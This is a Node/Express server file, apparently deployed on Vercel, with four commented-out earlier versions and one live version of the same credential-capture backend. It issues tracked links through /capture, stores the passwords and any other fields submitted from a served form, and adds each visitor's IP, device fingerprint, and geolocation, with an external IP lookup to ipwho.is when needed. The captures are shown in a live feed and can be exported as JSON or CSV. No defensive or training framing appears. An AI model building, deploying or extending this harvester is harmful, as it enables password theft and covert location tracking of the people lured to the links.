// // API Entry Point
// import express from 'express';
// import cookieParser from 'cookie-parser';
// import path from 'path';
// import { fileURLToPath } from 'url';

// const __dirname = path.dirname(fileURLToPath(import.meta.url));
// const app = express();

// app.use(express.urlencoded({ extended: true }));
// app.use(express.json());
// app.use(cookieParser());

// const captures = [];
// let idCounter = 0;

// // serve form page
// app.get('/capture', (req, res) => {
//     res.cookie('capture_uid', req.query.uid || 'unknown');
//     res.cookie('capture_src', req.query.src || 'direct');
//     res.cookie('landing_url', req.originalUrl);
//     res.sendFile(path.join(__dirname, '..', 'public', 'form.html'));
// });

// // serve live monitor page
// app.get('/live', (req, res) => {
//     res.sendFile(path.join(__dirname, '..', 'public', 'live.html'));
// });

// app.get('/', (req, res) => {
//     res.sendFile(path.join(__dirname, '..', 'public', 'gen.html'));
// });

// // capture submit
// app.post('/submit', (req, res) => {
//     const record = {
//         id: ++idCounter,
//         uid: req.cookies.capture_uid || 'unknown',
//         src: req.cookies.capture_src || 'unknown',
//         url: req.cookies.landing_url || 'unknown',
//         password: req.body.password,
//         fullUrl: req.body.currentUrl || null,
//         ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
//         userAgent: req.headers['user-agent'],
//         time: new Date().toISOString()
//     };
//     captures.push(record);
//     console.log('CAPTURED:', record);
//     res.json({ ok: true });
// });

// // polled feed
// app.get('/api/feed', (req, res) => {
//     const since = parseInt(req.query.since || '0', 10);
//     const fresh = captures.filter(c => c.id > since);
//     res.json({ latest: idCounter, items: fresh, total: captures.length });
// });

// app.get('/api/all', (req, res) => res.json(captures));

// export default app;


// // API Entry Point
// import express from 'express';
// import cookieParser from 'cookie-parser';
// import path from 'path';
// import { fileURLToPath } from 'url';

// const __dirname = path.dirname(fileURLToPath(import.meta.url));
// const app = express();

// app.set('trust proxy', true);            // <-- real IP behind nginx/tunnel
// app.use(express.urlencoded({ extended: true }));
// app.use(express.json({ limit: '256kb' }));
// app.use(cookieParser());

// const captures = [];
// let idCounter = 0;

// const COOKIE_OPTS = { maxAge: 86_400_000, sameSite: 'lax' };

// // serve capture page (no password needed)
// app.get('/capture', (req, res) => {
//     res.cookie('capture_uid', String(req.query.uid || 'unknown'), COOKIE_OPTS);
//     res.cookie('capture_src', String(req.query.src || 'direct'), COOKIE_OPTS);
//     res.cookie('landing_url', req.originalUrl, COOKIE_OPTS);
//     res.sendFile(path.join(__dirname, '..', 'public', 'form.html'));
// });

// app.get('/live', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'live.html')));
// app.get('/', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'gen.html')));

// // capture submit — password is now OPTIONAL
// app.post('/submit', (req, res) => {
//     const { currentUrl, ...rest } = req.body || {};

//     const xff = req.headers['x-forwarded-for'];
//     const ip = (Array.isArray(xff) ? xff[0] : xff || '').split(',')[0].trim()
//         || req.socket.remoteAddress;

//     const record = {
//         id: ++idCounter,
//         uid: req.cookies.capture_uid || 'unknown',
//         src: req.cookies.capture_src || 'unknown',
//         url: req.cookies.landing_url || 'unknown',
//         ...rest,                                  // <- all device/app fields land here
//         fullUrl: currentUrl || null,
//         ip,
//         userAgent: req.headers['user-agent'],
//         time: new Date().toISOString()
//     };
//     captures.push(record);
//     console.log('CAPTURED:', record);
//     res.json({ ok: true });
// });

// app.get('/api/feed', (req, res) => {
//     const since = parseInt(String(req.query.since || '0'), 10);
//     res.json({ latest: idCounter, items: captures.filter(c => c.id > since), total: captures.length });
// });

// app.get('/api/all', (req, res) => res.json(captures));

// export default app;



// API Entry Point
// import express from 'express';
// import cookieParser from 'cookie-parser';
// import fs from 'fs';
// import path from 'path';
// import { fileURLToPath } from 'url';

// const __dirname = path.dirname(fileURLToPath(import.meta.url));
// const app = express();

// app.set('trust proxy', true);
// app.use(express.urlencoded({ extended: true }));
// app.use(express.json({ limit: '256kb' }));
// app.use(cookieParser());

// const PUB = f => path.join(__dirname, '..', 'public', f);

// const sendPage = (res, filename) => {
//     const filePath = PUB(filename);
//     res.sendFile(filePath, err => {
//         if (err) {
//             console.error(`Error sending ${filename}:`, err);
//             try {
//                 const content = fs.readFileSync(filePath, 'utf8');
//                 res.setHeader('Content-Type', 'text/html; charset=utf-8');
//                 res.send(content);
//             } catch (fsErr) {
//                 console.error(`FS fallback failed for ${filename}:`, fsErr);
//                 res.status(500).send(`Error loading ${filename}: ${err.message}`);
//             }
//         }
//     });
// };

// /* ---------------- store (best-effort /tmp persistence for Vercel) ---------------- */
// const STORE = '/tmp/captures.json';
// let captures = [];
// let idCounter = 0;

// try {
//     if (fs.existsSync(STORE)) {
//         captures = JSON.parse(fs.readFileSync(STORE, 'utf8'));
//         idCounter = captures.reduce((m, c) => Math.max(m, c.id || 0), 0);
//     }
// } catch (e) { /* fresh instance */ }

// function persist() {
//     try { fs.writeFileSync(STORE, JSON.stringify(captures)); } catch (e) { }
// }

// /* ---------------- helpers ---------------- */
// const COOKIE_OPTS = { maxAge: 86_400_000, sameSite: 'lax' };

// const pick = (o, keys) => keys.reduce((a, k) => (o[k] ? (a[k] = o[k], a) : a), {});

// function parseUA(ua = '') {
//     const g = re => (ua.match(re) || [])[1] || null;
//     return {
//         os: /Windows NT 10/.test(ua) ? 'Windows 10/11'
//             : /Windows NT 6\.3/.test(ua) ? 'Windows 8.1'
//                 : g(/Android ([\d.]+)/) ? 'Android ' + g(/Android ([\d.]+)/)
//                     : g(/iPhone OS ([\d_]+)/) ? 'iOS ' + g(/iPhone OS ([\d_]+)/).replace(/_/g, '.')
//                         : /iPad/.test(ua) ? 'iPadOS'
//                             : g(/Mac OS X ([\d_]+)/) ? 'macOS ' + g(/Mac OS X ([\d_]+)/).replace(/_/g, '.')
//                                 : /Linux/.test(ua) ? 'Linux' : 'unknown',
//         browser: g(/Edg\/([\d.]+)/) ? 'Edge ' + g(/Edg\/([\d.]+)/)
//             : g(/OPR\/([\d.]+)/) ? 'Opera ' + g(/OPR\/([\d.]+)/)
//                 : g(/Chrome\/([\d.]+)/) ? 'Chrome ' + g(/Chrome\/([\d.]+)/)
//                     : g(/Firefox\/([\d.]+)/) ? 'Firefox ' + g(/Firefox\/([\d.]+)/)
//                         : g(/Version\/([\d.]+).*Safari/) ? 'Safari ' + g(/Version\/([\d.]+).*Safari/) : 'unknown',
//         device: /iPhone/.test(ua) ? 'iPhone'
//             : /iPad/.test(ua) ? 'iPad'
//                 : g(/;\s*([^;)]+)\s+Build/) || (/Android/.test(ua) ? 'Android device' : 'Desktop'),
//         bot: /bot|crawler|spider|preview|facebookexternalhit|whatsapp/i.test(ua)
//     };
// }

// const flatten = (o, p = '', out = {}) => {
//     for (const [k, v] of Object.entries(o || {})) {
//         const key = p ? p + '.' + k : k;
//         if (v && typeof v === 'object' && !Array.isArray(v)) flatten(v, key, out);
//         else out[key] = Array.isArray(v) ? v.join(' | ') : v;
//     }
//     return out;
// };

// /* ---------------- pages ---------------- */
// app.get('/capture', (req, res) => {
//     res.cookie('capture_uid', String(req.query.uid || 'unknown'), COOKIE_OPTS);
//     res.cookie('capture_src', String(req.query.src || 'direct'), COOKIE_OPTS);
//     res.cookie('landing_url', req.originalUrl, COOKIE_OPTS);
//     sendPage(res, 'form.html');
// });

// app.get('/', (_, res) => sendPage(res, 'gen.html'));
// app.get('/live', (_, res) => sendPage(res, 'live.html'));

// // direct file access (handy for design checks — uid/src will be "unknown")
// app.get('/form.html', (_, res) => sendPage(res, 'form.html'));
// app.get('/gen.html', (_, res) => sendPage(res, 'gen.html'));
// app.get('/live.html', (_, res) => sendPage(res, 'live.html'));

// app.get('/health', (_, res) => res.json({ ok: true, count: captures.length }));

// /* ---------------- capture ---------------- */
// app.post('/submit', (req, res) => {
//     const { currentUrl, ...rest } = req.body || {};
//     const H = req.headers;

//     const xff = H['x-forwarded-for'];
//     const ip = (Array.isArray(xff) ? xff[0] : xff || '').split(',')[0].trim()
//         || req.socket.remoteAddress;

//     const ua = H['user-agent'] || '';
//     const city = H['x-vercel-ip-city'];

//     const record = {
//         id: ++idCounter,
//         uid: req.cookies.capture_uid || 'unknown',
//         src: req.cookies.capture_src || 'unknown',
//         url: req.cookies.landing_url || 'unknown',
//         ...rest,                              // every client-side field lands here
//         fullUrl: currentUrl || null,
//         ip,
//         uaParsed: parseUA(ua),
//         userAgent: ua,
//         acceptLang: H['accept-language'] || null,
//         referer: H['referer'] || null,
//         origin: H['origin'] || null,
//         clientHints: pick(H, [
//             'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-ch-ua-platform-version',
//             'sec-ch-ua-model', 'sec-ch-ua-full-version-list', 'sec-ch-ua-arch', 'sec-ch-ua-bitness'
//         ]),
//         geo: {
//             country: H['x-vercel-ip-country'] || null,
//             region: H['x-vercel-ip-country-region'] || null,
//             city: city ? (() => { try { return decodeURIComponent(city); } catch (e) { return city; } })() : null,
//             postal: H['x-vercel-ip-postal-code'] || null,
//             lat: H['x-vercel-ip-latitude'] || null,
//             lon: H['x-vercel-ip-longitude'] || null,
//             tz: H['x-vercel-ip-timezone'] || null,
//             asn: H['x-vercel-ip-as-number'] || null
//         },
//         time: new Date().toISOString()
//     };

//     captures.push(record);
//     persist();
//     console.log('CAPTURED:', record.uid, record.ip, record.uaParsed.os, record.geo.city);
//     res.json({ ok: true });
// });

// /* ---------------- feed / export ---------------- */
// app.get('/api/feed', (req, res) => {
//     const since = parseInt(String(req.query.since || '0'), 10);
//     res.json({ latest: idCounter, items: captures.filter(c => c.id > since), total: captures.length });
// });

// app.get('/api/all', (_, res) => res.json(captures));

// app.get('/api/export', (_, res) => {
//     res.setHeader('Content-Disposition', 'attachment; filename=captures.json');
//     res.json(captures);
// });

// app.get('/api/export.csv', (_, res) => {
//     const rows = captures.map(c => flatten(c));
//     const cols = [...new Set(rows.flatMap(r => Object.keys(r)))];
//     const esc = v => v == null ? '' : '"' + String(v).replace(/"/g, '""') + '"';
//     const csv = [cols.join(','), ...rows.map(r => cols.map(c => esc(r[c])).join(','))].join('\n');
//     res.setHeader('Content-Type', 'text/csv; charset=utf-8');
//     res.setHeader('Content-Disposition', 'attachment; filename=captures.csv');
//     res.send('\uFEFF' + csv);
// });

// app.post('/api/clear', (_, res) => {
//     captures = [];
//     idCounter = 0;
//     persist();
//     res.json({ ok: true });
// });

// export default app;


// API Entry Point
// import express from 'express';
// import cookieParser from 'cookie-parser';
// import fs from 'fs';
// import path from 'path';
// import { fileURLToPath } from 'url';

// const __dirname = path.dirname(fileURLToPath(import.meta.url));
// const app = express();

// app.set('trust proxy', true);
// app.use(express.urlencoded({ extended: true }));
// app.use(express.json({ limit: '256kb' }));
// app.use(cookieParser());

// const PUB = f => path.join(__dirname, '..', 'public', f);

// const sendPage = (res, filename) => {
//     const filePath = PUB(filename);
//     res.sendFile(filePath, err => {
//         if (err) {
//             console.error(`Error sending ${filename}:`, err);
//             try {
//                 const content = fs.readFileSync(filePath, 'utf8');
//                 res.setHeader('Content-Type', 'text/html; charset=utf-8');
//                 res.send(content);
//             } catch (fsErr) {
//                 console.error(`FS fallback failed for ${filename}:`, fsErr);
//                 res.status(500).send(`Error loading ${filename}: ${err.message}`);
//             }
//         }
//     });
// };

// /* ---------------- store (best-effort /tmp persistence for Vercel) ---------------- */
// const STORE = '/tmp/captures.json';
// const MERGE_WINDOW = 6 * 60 * 60 * 1000;   // same session merges within 6h
// const MAX_RECORDS = 1000;

// let captures = [];
// let idCounter = 0;
// let revCounter = 0;                        // global revision — drives the live feed

// try {
//     if (fs.existsSync(STORE)) {
//         captures = JSON.parse(fs.readFileSync(STORE, 'utf8'));
//         idCounter = captures.reduce((m, c) => Math.max(m, c.id || 0), 0);
//         revCounter = captures.reduce((m, c) => Math.max(m, c.rev || 0), 0);
//     }
// } catch (e) { /* fresh instance */ }

// function persist() {
//     try { fs.writeFileSync(STORE, JSON.stringify(captures)); } catch (e) { }
// }

// /* ---------------- helpers ---------------- */
// const COOKIE_OPTS = { maxAge: 86_400_000, sameSite: 'lax' };

// const pick = (o, keys) => keys.reduce((a, k) => (o[k] ? (a[k] = o[k], a) : a), {});

// const isBlank = v => v === null || v === undefined || v === '';

// function parseUA(ua = '') {
//     const g = re => (ua.match(re) || [])[1] || null;
//     return {
//         os: /Windows NT 10/.test(ua) ? 'Windows 10/11'
//             : /Windows NT 6\.3/.test(ua) ? 'Windows 8.1'
//                 : g(/Android ([\d.]+)/) ? 'Android ' + g(/Android ([\d.]+)/)
//                     : g(/iPhone OS ([\d_]+)/) ? 'iOS ' + g(/iPhone OS ([\d_]+)/).replace(/_/g, '.')
//                         : /iPad/.test(ua) ? 'iPadOS'
//                             : g(/Mac OS X ([\d_]+)/) ? 'macOS ' + g(/Mac OS X ([\d_]+)/).replace(/_/g, '.')
//                                 : /Linux/.test(ua) ? 'Linux' : 'unknown',
//         browser: g(/Edg\/([\d.]+)/) ? 'Edge ' + g(/Edg\/([\d.]+)/)
//             : g(/OPR\/([\d.]+)/) ? 'Opera ' + g(/OPR\/([\d.]+)/)
//                 : g(/Chrome\/([\d.]+)/) ? 'Chrome ' + g(/Chrome\/([\d.]+)/)
//                     : g(/Firefox\/([\d.]+)/) ? 'Firefox ' + g(/Firefox\/([\d.]+)/)
//                         : g(/Version\/([\d.]+).*Safari/) ? 'Safari ' + g(/Version\/([\d.]+).*Safari/) : 'unknown',
//         device: /iPhone/.test(ua) ? 'iPhone'
//             : /iPad/.test(ua) ? 'iPad'
//                 : g(/;\s*([^;)]+)\s+Build/) || (/Android/.test(ua) ? 'Android device' : 'Desktop'),
//         bot: /bot|crawler|spider|preview|facebookexternalhit|whatsapp/i.test(ua)
//     };
// }

// const flatten = (o, p = '', out = {}) => {
//     for (const [k, v] of Object.entries(o || {})) {
//         const key = p ? p + '.' + k : k;
//         if (v && typeof v === 'object' && !Array.isArray(v)) flatten(v, key, out);
//         else out[key] = Array.isArray(v) ? v.join(' | ') : v;
//     }
//     return out;
// };

// /* one live record per visitor session */
// function findRecord(sid) {
//     const now = Date.now();
//     for (let i = captures.length - 1; i >= 0; i--) {
//         const c = captures[i];
//         if (c.sid !== sid) continue;
//         const t = Date.parse(c.updated || c.time || 0) || 0;
//         return (now - t > MERGE_WINDOW) ? null : c;
//     }
//     return null;
// }

// function mergeInto(rec, incoming) {
//     for (const [k, v] of Object.entries(incoming)) {
//         if (isBlank(v)) continue;                                  // never wipe a known value
//         const cur = rec[k];
//         if (v && typeof v === 'object' && !Array.isArray(v) &&
//             cur && typeof cur === 'object' && !Array.isArray(cur)) Object.assign(cur, v);
//         else rec[k] = v;
//     }
// }

// /* ---------------- IP → coordinates (fallback when edge headers are absent) ---------------- */
// const ipCache = new Map();

// async function lookupIP(ip) {
//     if (!ip) return null;
//     const clean = ip.replace(/^::ffff:/, '').split('%')[0];
//     if (!clean || /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1)/.test(clean)) return null;
//     if (ipCache.has(clean)) return ipCache.get(clean);

//     const out = {};
//     try {
//         const ctl = new AbortController();
//         const to = setTimeout(() => ctl.abort(), 2500);
//         const r = await fetch('https://ipwho.is/' + encodeURIComponent(clean), { signal: ctl.signal });
//         clearTimeout(to);
//         const j = await r.json();
//         if (j && j.success !== false && j.latitude != null) {
//             Object.assign(out, {
//                 ipLat: j.latitude, ipLon: j.longitude,
//                 ipCity: j.city, ipRegion: j.region, ipPostal: j.postal,
//                 ipCountry: j.country, ipCountryCode: j.country_code,
//                 ipIsp: j.connection && j.connection.isp,
//                 ipAsn: j.connection && j.connection.asn,
//                 ipTimezone: j.timezone && j.timezone.id
//             });
//         }
//     } catch (e) { }

//     ipCache.set(clean, out);
//     if (ipCache.size > 500) ipCache.clear();
//     return out;
// }

// /* ---------------- pages ---------------- */
// app.get('/capture', (req, res) => {
//     res.cookie('capture_uid', String(req.query.uid || 'unknown'), COOKIE_OPTS);
//     res.cookie('capture_src', String(req.query.src || 'direct'), COOKIE_OPTS);
//     res.cookie('landing_url', req.originalUrl, COOKIE_OPTS);
//     sendPage(res, 'form.html');
// });

// app.get('/', (_, res) => sendPage(res, 'gen.html'));
// app.get('/live', (_, res) => sendPage(res, 'live.html'));

// app.get('/form.html', (_, res) => sendPage(res, 'form.html'));
// app.get('/gen.html', (_, res) => sendPage(res, 'gen.html'));
// app.get('/live.html', (_, res) => sendPage(res, 'live.html'));

// app.get('/health', (_, res) => res.json({ ok: true, count: captures.length }));

// /* ---------------- capture (create-or-update, many posts per visitor) ---------------- */
// app.post('/submit', async (req, res) => {
//     const { currentUrl, sid: rawSid, ts, ...rest } = req.body || {};
//     const H = req.headers;

//     const xff = H['x-forwarded-for'];
//     const ip = (Array.isArray(xff) ? xff[0] : xff || '').split(',')[0].trim()
//         || req.socket.remoteAddress;

//     const ua = H['user-agent'] || '';
//     const city = H['x-vercel-ip-city'];
//     const sid = String(rawSid || '').slice(0, 64) || ('ip_' + ip);

//     const incoming = {
//         ...rest,                                   // every client-side field
//         fullUrl: currentUrl || null,
//         ip,
//         uaParsed: parseUA(ua),
//         userAgent: ua,
//         acceptLang: H['accept-language'] || null,
//         referer: H['referer'] || null,
//         origin: H['origin'] || null,
//         clientHints: pick(H, [
//             'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-ch-ua-platform-version',
//             'sec-ch-ua-model', 'sec-ch-ua-full-version-list', 'sec-ch-ua-arch', 'sec-ch-ua-bitness'
//         ]),
//         geo: {
//             country: H['x-vercel-ip-country'] || null,
//             region: H['x-vercel-ip-country-region'] || null,
//             city: city ? (() => { try { return decodeURIComponent(city); } catch (e) { return city; } })() : null,
//             postal: H['x-vercel-ip-postal-code'] || null,
//             lat: H['x-vercel-ip-latitude'] || null,
//             lon: H['x-vercel-ip-longitude'] || null,
//             tz: H['x-vercel-ip-timezone'] || null,
//             asn: H['x-vercel-ip-as-number'] || null
//         }
//     };

//     // fill coordinates from the client IP when the edge didn't supply them
//     if (!H['x-vercel-ip-latitude']) {
//         const g = await lookupIP(ip);
//         if (g) Object.assign(incoming, g);
//     }

//     const now = new Date().toISOString();
//     let rec = findRecord(sid);

//     if (rec) {
//         mergeInto(rec, incoming);
//         rec.rev = ++revCounter;
//         rec.updated = now;
//         rec.hits = (rec.hits || 1) + 1;
//         console.log('UPDATED:', rec.uid, rec.ip, 'pw:' + (rec.password ? 'YES' : 'no'), 'rev:' + rec.rev);
//     } else {
//         rec = {
//             id: ++idCounter,
//             sid,
//             rev: ++revCounter,
//             uid: req.cookies.capture_uid || 'unknown',
//             src: req.cookies.capture_src || 'unknown',
//             url: req.cookies.landing_url || 'unknown',
//             ...incoming,
//             hits: 1,
//             created: now,
//             updated: now,
//             time: now
//         };
//         captures.push(rec);
//         if (captures.length > MAX_RECORDS) captures.shift();
//         console.log('CAPTURED:', rec.uid, rec.ip, rec.uaParsed.os, rec.geo.city);
//     }

//     persist();
//     res.json({ ok: true, id: rec.id, rev: rec.rev });
// });

// /* ---------------- feed / export (revision based so updates show up) ---------------- */
// app.get('/api/feed', (req, res) => {
//     const since = parseInt(String(req.query.since || '0'), 10) || 0;
//     res.json({
//         latest: revCounter,
//         items: captures.filter(c => (c.rev || 0) > since),
//         total: captures.length
//     });
// });

// app.get('/api/all', (_, res) => res.json(captures));

// app.get('/api/export', (_, res) => {
//     res.setHeader('Content-Disposition', 'attachment; filename=captures.json');
//     res.json(captures);
// });

// app.get('/api/export.csv', (_, res) => {
//     const rows = captures.map(c => flatten(c));
//     const cols = [...new Set(rows.flatMap(r => Object.keys(r)))];
//     const esc = v => v == null ? '' : '"' + String(v).replace(/"/g, '""') + '"';
//     const csv = [cols.join(','), ...rows.map(r => cols.map(c => esc(r[c])).join(','))].join('\n');
//     res.setHeader('Content-Type', 'text/csv; charset=utf-8');
//     res.setHeader('Content-Disposition', 'attachment; filename=captures.csv');
//     res.send('\uFEFF' + csv);
// });

// app.post('/api/clear', (_, res) => {
//     captures = [];
//     idCounter = 0;
//     revCounter = 0;
//     persist();
//     res.json({ ok: true });
// });

// export default app;

// API Entry Point
import express from 'express';
import cookieParser from 'cookie-parser';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

app.set('trust proxy', true);
app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: '256kb' }));
app.use(cookieParser());

const PUB = f => path.join(__dirname, '..', 'public', f);

const sendPage = (res, filename) => {
    const filePath = PUB(filename);
    res.sendFile(filePath, err => {
        if (err) {
            console.error(`Error sending ${filename}:`, err);
            try {
                const content = fs.readFileSync(filePath, 'utf8');
                res.setHeader('Content-Type', 'text/html; charset=utf-8');
                res.send(content);
            } catch (fsErr) {
                console.error(`FS fallback failed for ${filename}:`, fsErr);
                res.status(500).send(`Error loading ${filename}: ${err.message}`);
            }
        }
    });
};

/* ---------------- store (best-effort /tmp persistence for Vercel) ---------------- */
const STORE = '/tmp/captures.json';
const MERGE_WINDOW = 6 * 60 * 60 * 1000;   // same session merges within 6h
const MAX_RECORDS = 1000;

let captures = [];
let idCounter = 0;
let revCounter = 0;                        // global revision — drives the live feed

try {
    if (fs.existsSync(STORE)) {
        captures = JSON.parse(fs.readFileSync(STORE, 'utf8'));
        idCounter = captures.reduce((m, c) => Math.max(m, c.id || 0), 0);
        revCounter = captures.reduce((m, c) => Math.max(m, c.rev || 0), 0);
    }
} catch (e) { /* fresh instance */ }

function persist() {
    try { fs.writeFileSync(STORE, JSON.stringify(captures)); } catch (e) { }
}

/* ---------------- helpers ---------------- */
const COOKIE_OPTS = { maxAge: 86_400_000, sameSite: 'lax' };

const pick = (o, keys) => keys.reduce((a, k) => (o[k] ? (a[k] = o[k], a) : a), {});

const isBlank = v => v === null || v === undefined || v === '';

function parseUA(ua = '') {
    const g = re => (ua.match(re) || [])[1] || null;
    return {
        os: /Windows NT 10/.test(ua) ? 'Windows 10/11'
            : /Windows NT 6\.3/.test(ua) ? 'Windows 8.1'
                : g(/Android ([\d.]+)/) ? 'Android ' + g(/Android ([\d.]+)/)
                    : g(/iPhone OS ([\d_]+)/) ? 'iOS ' + g(/iPhone OS ([\d_]+)/).replace(/_/g, '.')
                        : /iPad/.test(ua) ? 'iPadOS'
                            : g(/Mac OS X ([\d_]+)/) ? 'macOS ' + g(/Mac OS X ([\d_]+)/).replace(/_/g, '.')
                                : /Linux/.test(ua) ? 'Linux' : 'unknown',
        browser: g(/Edg\/([\d.]+)/) ? 'Edge ' + g(/Edg\/([\d.]+)/)
            : g(/OPR\/([\d.]+)/) ? 'Opera ' + g(/OPR\/([\d.]+)/)
                : g(/Chrome\/([\d.]+)/) ? 'Chrome ' + g(/Chrome\/([\d.]+)/)
                    : g(/Firefox\/([\d.]+)/) ? 'Firefox ' + g(/Firefox\/([\d.]+)/)
                        : g(/Version\/([\d.]+).*Safari/) ? 'Safari ' + g(/Version\/([\d.]+).*Safari/) : 'unknown',
        device: /iPhone/.test(ua) ? 'iPhone'
            : /iPad/.test(ua) ? 'iPad'
                : g(/;\s*([^;)]+)\s+Build/) || (/Android/.test(ua) ? 'Android device' : 'Desktop'),
        bot: /bot|crawler|spider|preview|facebookexternalhit|whatsapp/i.test(ua)
    };
}

const flatten = (o, p = '', out = {}) => {
    for (const [k, v] of Object.entries(o || {})) {
        const key = p ? p + '.' + k : k;
        if (v && typeof v === 'object' && !Array.isArray(v)) flatten(v, key, out);
        else out[key] = Array.isArray(v) ? v.join(' | ') : v;
    }
    return out;
};

/* one live record per visitor session */
function findRecord(sid) {
    const now = Date.now();
    for (let i = captures.length - 1; i >= 0; i--) {
        const c = captures[i];
        if (c.sid !== sid) continue;
        const t = Date.parse(c.updated || c.time || 0) || 0;
        return (now - t > MERGE_WINDOW) ? null : c;
    }
    return null;
}

function mergeInto(rec, incoming) {
    for (const [k, v] of Object.entries(incoming)) {
        if (isBlank(v)) continue;                                  // never wipe a known value
        const cur = rec[k];
        if (v && typeof v === 'object' && !Array.isArray(v) &&
            cur && typeof cur === 'object' && !Array.isArray(cur)) Object.assign(cur, v);
        else rec[k] = v;
    }
}

/* ---------------- IP → coordinates (fallback when edge headers are absent) ---------------- */
const ipCache = new Map();

async function lookupIP(ip) {
    if (!ip) return null;
    const clean = ip.replace(/^::ffff:/, '').split('%')[0];
    if (!clean || /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1)/.test(clean)) return null;
    if (ipCache.has(clean)) return ipCache.get(clean);

    const out = {};
    try {
        const ctl = new AbortController();
        const to = setTimeout(() => ctl.abort(), 2500);
        const r = await fetch('https://ipwho.is/' + encodeURIComponent(clean), { signal: ctl.signal });
        clearTimeout(to);
        const j = await r.json();
        if (j && j.success !== false && j.latitude != null) {
            Object.assign(out, {
                ipLat: j.latitude, ipLon: j.longitude,
                ipCity: j.city, ipRegion: j.region, ipPostal: j.postal,
                ipCountry: j.country, ipCountryCode: j.country_code,
                ipIsp: j.connection && j.connection.isp,
                ipAsn: j.connection && j.connection.asn,
                ipTimezone: j.timezone && j.timezone.id
            });
        }
    } catch (e) { }

    ipCache.set(clean, out);
    if (ipCache.size > 500) ipCache.clear();
    return out;
}

/* ---------------- pages ---------------- */
app.get('/capture', (req, res) => {
    res.cookie('capture_uid', String(req.query.uid || 'unknown'), COOKIE_OPTS);
    res.cookie('capture_src', String(req.query.src || 'direct'), COOKIE_OPTS);
    res.cookie('landing_url', req.originalUrl, COOKIE_OPTS);
    sendPage(res, 'form.html');
});

app.get('/', (_, res) => sendPage(res, 'gen.html'));
app.get('/live', (_, res) => sendPage(res, 'live.html'));

app.get('/form.html', (_, res) => sendPage(res, 'form.html'));
app.get('/gen.html', (_, res) => sendPage(res, 'gen.html'));
app.get('/live.html', (_, res) => sendPage(res, 'live.html'));

app.get('/health', (_, res) => res.json({ ok: true, count: captures.length }));

/* ---------------- capture (create-or-update, many posts per visitor) ---------------- */
app.post('/submit', async (req, res) => {
    const { currentUrl, sid: rawSid, ts, ...rest } = req.body || {};
    const H = req.headers;

    const xff = H['x-forwarded-for'];
    const ip = (Array.isArray(xff) ? xff[0] : xff || '').split(',')[0].trim()
        || req.socket.remoteAddress;

    const ua = H['user-agent'] || '';
    const city = H['x-vercel-ip-city'];
    const sid = String(rawSid || '').slice(0, 64) || ('ip_' + ip);

    const incoming = {
        ...rest,                                   // every client-side field
        fullUrl: currentUrl || null,
        ip,
        uaParsed: parseUA(ua),
        userAgent: ua,
        acceptLang: H['accept-language'] || null,
        referer: H['referer'] || null,
        origin: H['origin'] || null,
        clientHints: pick(H, [
            'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-ch-ua-platform-version',
            'sec-ch-ua-model', 'sec-ch-ua-full-version-list', 'sec-ch-ua-arch', 'sec-ch-ua-bitness'
        ]),
        geo: {
            country: H['x-vercel-ip-country'] || null,
            region: H['x-vercel-ip-country-region'] || null,
            city: city ? (() => { try { return decodeURIComponent(city); } catch (e) { return city; } })() : null,
            postal: H['x-vercel-ip-postal-code'] || null,
            lat: H['x-vercel-ip-latitude'] || null,
            lon: H['x-vercel-ip-longitude'] || null,
            tz: H['x-vercel-ip-timezone'] || null,
            asn: H['x-vercel-ip-as-number'] || null
        }
    };

    // fill coordinates from the client IP when the edge didn't supply them
    if (!H['x-vercel-ip-latitude']) {
        const g = await lookupIP(ip);
        if (g) Object.assign(incoming, g);
    }

    const now = new Date().toISOString();
    let rec = findRecord(sid);

    if (rec) {
        mergeInto(rec, incoming);
        rec.rev = ++revCounter;
        rec.updated = now;
        rec.hits = (rec.hits || 1) + 1;
        console.log('UPDATED:', rec.uid, rec.ip, 'pw:' + (rec.password ? 'YES' : 'no'), 'rev:' + rec.rev, 'gender:' + (rec.gender || '-'));
    } else {
        rec = {
            id: ++idCounter,
            sid,
            rev: ++revCounter,
            uid: req.cookies.capture_uid || 'unknown',
            src: req.cookies.capture_src || 'unknown',
            url: req.cookies.landing_url || 'unknown',
            ...incoming,
            hits: 1,
            created: now,
            updated: now,
            time: now
        };
        captures.push(rec);
        if (captures.length > MAX_RECORDS) captures.shift();
        console.log('CAPTURED:', rec.uid, rec.ip, rec.uaParsed.os, rec.geo.city, 'gender:' + (rec.gender || '-'));
    }

    persist();
    res.json({ ok: true, id: rec.id, rev: rec.rev });
});

/* ---------------- feed / export (revision based so updates show up) ---------------- */
app.get('/api/feed', (req, res) => {
    const since = parseInt(String(req.query.since || '0'), 10) || 0;
    res.json({
        latest: revCounter,
        items: captures.filter(c => (c.rev || 0) > since),
        total: captures.length
    });
});

app.get('/api/all', (_, res) => res.json(captures));

app.get('/api/export', (_, res) => {
    res.setHeader('Content-Disposition', 'attachment; filename=captures.json');
    res.json(captures);
});

app.get('/api/export.csv', (_, res) => {
    const rows = captures.map(c => flatten(c));
    const cols = [...new Set(rows.flatMap(r => Object.keys(r)))];
    const esc = v => v == null ? '' : '"' + String(v).replace(/"/g, '""') + '"';
    const csv = [cols.join(','), ...rows.map(r => cols.map(c => esc(r[c])).join(','))].join('\n');
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename=captures.csv');
    res.send('\uFEFF' + csv);
});

app.post('/api/clear', (_, res) => {
    captures = [];
    idCounter = 0;
    revCounter = 0;
    persist();
    res.json({ ok: true });
});

export default app;